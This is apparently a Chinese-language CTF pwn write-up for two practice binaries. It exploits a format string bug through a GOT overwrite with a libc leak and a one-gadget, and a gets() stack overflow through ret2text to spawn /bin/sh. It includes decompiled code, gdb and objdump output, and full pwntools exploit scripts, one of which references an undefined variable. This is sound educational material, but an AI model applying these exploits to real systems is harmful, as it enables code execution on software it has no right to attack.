# PWN

<!-- vim-markdown-toc GFM -->

* [stack overflow](#stack-overflow)
* [format string](#format-string)
	* [babyFmtstr](#babyfmtstr)
* [ROP](#rop)
	* [ret2text](#ret2text)

<!-- vim-markdown-toc -->

## stack overflow

## format string

### babyFmtstr

ida打开，查看main()
```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  FILE *v3; // rdi
  void *ptr; // ST08_8
  void *v5; // ST10_8

  setbuf(stdin, 0LL);
  v3 = stdout;
  setbuf(stdout, 0LL);
  ptr = (void *)sub_400D0A(v3, 0LL);
  v5 = (void *)sub_400DA0();
  printf("your motto is \"%s\"\n", v5);
  free(ptr);
  free(v5);
  return 0LL;
}
```

查看ptr，v5后面的两个函数，重命名为`input_name()`和`input_motto()`

```c
char *input_name()
{
  char *v0; // ST08_8
  char s; // [rsp+10h] [rbp-40h]
  unsigned __int64 v3; // [rsp+48h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sleep(0);
  puts("please input name:");
  sub_400BF5(&s, 50LL);
  v0 = strdup(&s);
  printf("Hello ", sleep);
  printf(&s);
  return v0;
}
```
存在格式化字符串漏洞，可以输入长度小于等于50字节的格式化字符串

partial relro,可以改写GOT表。
```
checksec PWN_babyFmtstr
[*] '/--/PWN/PWN_babyFmtstr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
利用格式化字符串漏洞，将程序末尾的free函数的GOT表改写为main，让程序重复执行，同时泄漏libc
再次利用格式化字符串漏洞，改某函数GOT表，最终执行system(cmd)，拿到flag。

```python
>>> from pwn import *
>>> elf = ELF("PWN_babyFmtstr")
[*] '/media/cm/a508df67-fffc-4dc7-a57a-72fc8acab7a6/GitRepository/Write-up-CTF/PWN/PWN_babyFmtstr'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
>>> print("0x"+"%x" %elf.symbols['printf'])
0x400980
>>> print("0x"+"%x" %elf.got['printf'])
0x602018
```
```bash
$ objdump -d -j .plt PWN_babyFmtstr 

PWN_babyFmtstr：     文件格式 elf64-x86-64


Déassemblage de la section .plt :

0000000000400970 <printf@plt-0x10>:
  400970:	ff 35 92 16 20 00    	pushq  0x201692(%rip)        # 602008 <__gmon_start__@plt+0x201578>
  400976:	ff 25 94 16 20 00    	jmpq   *0x201694(%rip)        # 602010 <__gmon_start__@plt+0x201580>
  40097c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400980 <printf@plt>:
  400980:	ff 25 92 16 20 00    	jmpq   *0x201692(%rip)        # 602018 <__gmon_start__@plt+0x201588>
  400986:	68 00 00 00 00       	pushq  $0x0
  40098b:	e9 e0 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400990 <memset@plt>:
  400990:	ff 25 8a 16 20 00    	jmpq   *0x20168a(%rip)        # 602020 <__gmon_start__@plt+0x201590>
  400996:	68 01 00 00 00       	pushq  $0x1
  40099b:	e9 d0 ff ff ff       	jmpq   400970 <printf@plt-0x10>

00000000004009a0 <puts@plt>:
  4009a0:	ff 25 82 16 20 00    	jmpq   *0x201682(%rip)        # 602028 <__gmon_start__@plt+0x201598>
  4009a6:	68 02 00 00 00       	pushq  $0x2
  4009ab:	e9 c0 ff ff ff       	jmpq   400970 <printf@plt-0x10>

00000000004009b0 <read@plt>:
  4009b0:	ff 25 7a 16 20 00    	jmpq   *0x20167a(%rip)        # 602030 <__gmon_start__@plt+0x2015a0>
  4009b6:	68 03 00 00 00       	pushq  $0x3
  4009bb:	e9 b0 ff ff ff       	jmpq   400970 <printf@plt-0x10>

00000000004009c0 <__libc_start_main@plt>:
  4009c0:	ff 25 72 16 20 00    	jmpq   *0x201672(%rip)        # 602038 <__gmon_start__@plt+0x2015a8>
  4009c6:	68 04 00 00 00       	pushq  $0x4
  4009cb:	e9 a0 ff ff ff       	jmpq   400970 <printf@plt-0x10>

00000000004009d0 <free@plt>:
  4009d0:	ff 25 6a 16 20 00    	jmpq   *0x20166a(%rip)        # 602040 <__gmon_start__@plt+0x2015b0>
  4009d6:	68 05 00 00 00       	pushq  $0x5
  4009db:	e9 90 ff ff ff       	jmpq   400970 <printf@plt-0x10>

00000000004009e0 <sleep@plt>:
  4009e0:	ff 25 62 16 20 00    	jmpq   *0x201662(%rip)        # 602048 <__gmon_start__@plt+0x2015b8>
  4009e6:	68 06 00 00 00       	pushq  $0x6
  4009eb:	e9 80 ff ff ff       	jmpq   400970 <printf@plt-0x10>

00000000004009f0 <setbuf@plt>:
  4009f0:	ff 25 5a 16 20 00    	jmpq   *0x20165a(%rip)        # 602050 <__gmon_start__@plt+0x2015c0>
  4009f6:	68 07 00 00 00       	pushq  $0x7
  4009fb:	e9 70 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a00 <strdup@plt>:
  400a00:	ff 25 52 16 20 00    	jmpq   *0x201652(%rip)        # 602058 <__gmon_start__@plt+0x2015c8>
  400a06:	68 08 00 00 00       	pushq  $0x8
  400a0b:	e9 60 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a10 <__stack_chk_fail@plt>:
  400a10:	ff 25 4a 16 20 00    	jmpq   *0x20164a(%rip)        # 602060 <__gmon_start__@plt+0x2015d0>
  400a16:	68 09 00 00 00       	pushq  $0x9
  400a1b:	e9 50 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a20 <__cxa_allocate_exception@plt>:
  400a20:	ff 25 42 16 20 00    	jmpq   *0x201642(%rip)        # 602068 <__gmon_start__@plt+0x2015d8>
  400a26:	68 0a 00 00 00       	pushq  $0xa
  400a2b:	e9 40 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a30 <__cxa_throw@plt>:
  400a30:	ff 25 3a 16 20 00    	jmpq   *0x20163a(%rip)        # 602070 <__gmon_start__@plt+0x2015e0>
  400a36:	68 0b 00 00 00       	pushq  $0xb
  400a3b:	e9 30 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a40 <__cxa_end_catch@plt>:
  400a40:	ff 25 32 16 20 00    	jmpq   *0x201632(%rip)        # 602078 <__gmon_start__@plt+0x2015e8>
  400a46:	68 0c 00 00 00       	pushq  $0xc
  400a4b:	e9 20 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a50 <strtoll@plt>:
  400a50:	ff 25 2a 16 20 00    	jmpq   *0x20162a(%rip)        # 602080 <__gmon_start__@plt+0x2015f0>
  400a56:	68 0d 00 00 00       	pushq  $0xd
  400a5b:	e9 10 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a60 <__cxa_begin_catch@plt>:
  400a60:	ff 25 22 16 20 00    	jmpq   *0x201622(%rip)        # 602088 <__gmon_start__@plt+0x2015f8>
  400a66:	68 0e 00 00 00       	pushq  $0xe
  400a6b:	e9 00 ff ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a70 <__gxx_personality_v0@plt>:
  400a70:	ff 25 1a 16 20 00    	jmpq   *0x20161a(%rip)        # 602090 <__gmon_start__@plt+0x201600>
  400a76:	68 0f 00 00 00       	pushq  $0xf
  400a7b:	e9 f0 fe ff ff       	jmpq   400970 <printf@plt-0x10>

0000000000400a80 <_Unwind_Resume@plt>:
  400a80:	ff 25 12 16 20 00    	jmpq   *0x201612(%rip)        # 602098 <__gmon_start__@plt+0x201608>
  400a86:	68 10 00 00 00       	pushq  $0x10
  400a8b:	e9 e0 fe ff ff       	jmpq   400970 <printf@plt-0x10>
$ objdump -R PWN_babyFmtstr 

PWN_babyFmtstr：     文件格式 elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000601ff8 R_X86_64_GLOB_DAT  __gmon_start__
00000000006020c0 R_X86_64_COPY     stdin@@GLIBC_2.2.5
00000000006020e0 R_X86_64_COPY     _ZTIPKc@@CXXABI_1.3
0000000000602100 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000602018 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
0000000000602020 R_X86_64_JUMP_SLOT  memset@GLIBC_2.2.5
0000000000602028 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
0000000000602030 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
0000000000602038 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
0000000000602040 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
0000000000602048 R_X86_64_JUMP_SLOT  sleep@GLIBC_2.2.5
0000000000602050 R_X86_64_JUMP_SLOT  setbuf@GLIBC_2.2.5
0000000000602058 R_X86_64_JUMP_SLOT  strdup@GLIBC_2.2.5
0000000000602060 R_X86_64_JUMP_SLOT  __stack_chk_fail@GLIBC_2.4
0000000000602068 R_X86_64_JUMP_SLOT  __cxa_allocate_exception@CXXABI_1.3
0000000000602070 R_X86_64_JUMP_SLOT  __cxa_throw@CXXABI_1.3
0000000000602078 R_X86_64_JUMP_SLOT  __cxa_end_catch@CXXABI_1.3
0000000000602080 R_X86_64_JUMP_SLOT  strtoll@GLIBC_2.2.5
0000000000602088 R_X86_64_JUMP_SLOT  __cxa_begin_catch@CXXABI_1.3
0000000000602090 R_X86_64_JUMP_SLOT  __gxx_personality_v0@CXXABI_1.3
0000000000602098 R_X86_64_JUMP_SLOT  _Unwind_Resume@GCC_3.0

```

exp
```python
from pwn import *
r=process('./babyfmtstr')
gdb.attach(r,'b * 0x0400e31')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./babyfmtstr')

strdup_got = elf.got['strdup']
free_got = elf.got['free']
printf_got = elf.got['printf']
cxa_allocate_exception_got = elf.got['__cxa_allocate_exception']

r.recvuntil('name:')
#r.sendline('aaaaaaaa%8$p')

r.sendline('%25$p%50c%12$n%2368c%13$hn'+cyclic(6)+p64(strdup_got+2)+p64(strdup_got))
r.recvuntil('Hello ')
lsmr = int(r.recv(14),16)
log.success('libc_start_main_ret:'+hex(lsmr))
r.recvuntil('motto:')
r.sendline('1024')
r.recvuntil('motto:')

if local == 1:
    lsmrp = 0x020840
else:
    lsmrp = 0x020830

libc_addr = lsmr - lsmrp
if local == 1:
    ogg = 0x45226+libc_addr
else:
    ogg = 0x45216+libc_addr

log.success('libc_addr:'+hex(libc_addr))

ogglist = [ogg&0xffff,(ogg>>16)&0xffff,(ogg>>32)&0xffff]
exp = "%"+str(ogglist[0])+'c%16$hn%'+str((ogglist[1]+0x10000-ogglist[0])%0x10000)+'c%17$hn'
print len(exp)
print exp
exp+='\x00'*(64-len(exp))+p64(printf_got)+p64(printf_got+2)+p64(printf_got+4)
r.sendline(exp)
log.success('ogg:'+hex(ogg))

r.interactive()
```

## ROP

### ret2text

源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void secure(void)
{
    int secretcode, input;
    srand(time(NULL));

    secretcode = rand();
    scanf("%d", &input);
    if(input == secretcode)
        system("/bin/sh");
}

int main(void)
{
    setvbuf(stdout, 0LL, 2, 0LL);
    setvbuf(stdin, 0LL, 1, 0LL);

    char buf[100];

    printf("There is something amazing here, do you know anything?\n");
    gets(buf);
    printf("Maybe I will tell you next time !");

    return 0;
}
```

源代码中有main()函数和secure()函数。
main()中`gets(buf)`可以控制输入，溢出。如果能使RA被覆盖成secure()中出现的`system("/bin/sh")`地址就可以完成攻击。

首先确定输入,使用py3的`cyclic(200)`生成200个字符的字符串

```
gdb-peda$ run
Starting program: /---/ret2text
There is something amazing here, do you know anything?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Maybe I will tell you next time !
Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x0
ECX: 0x21 ('!')
EDX: 0xf7fab890 --> 0x0
ESI: 0xf7faa000 --> 0x1d7d8c
EDI: 0x0
EBP: 0x62616163 ('caab')
ESP: 0xffffcd30 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
EIP: 0x62616164 ('daab')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x62616164
[------------------------------------stack-------------------------------------]
0000| 0xffffcd30 ("eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0004| 0xffffcd34 ("faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0008| 0xffffcd38 ("gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0012| 0xffffcd3c ("haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0016| 0xffffcd40 ("iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0020| 0xffffcd44 ("jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0024| 0xffffcd48 ("kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0028| 0xffffcd4c ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x62616164 in ?? ()

```

可以看到`0x62616164 in ?? ()`这个地址是无效的,也就是RA被覆盖成了这个无效的地址。

py3使用pwn寻找offset

```python
>>> cyclic(200)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
>>> p32(0x62616164)
b'daab'
>>> cyclic_find('daab')
112
```

打开ida,搜索字符串bin/sh
```
.text:08048638                 jnz     short locret_8048646
.text:0804863A                 mov     dword ptr [esp], offset command ; "/bin/sh"
```
即需要将RA覆盖为0804863A

exp

```python
from pwn import *

target = 0x0804863a

sh = process("./ret2text")

sh.sendline('A'*112+str(p32(target)))
sh.interactive()
```

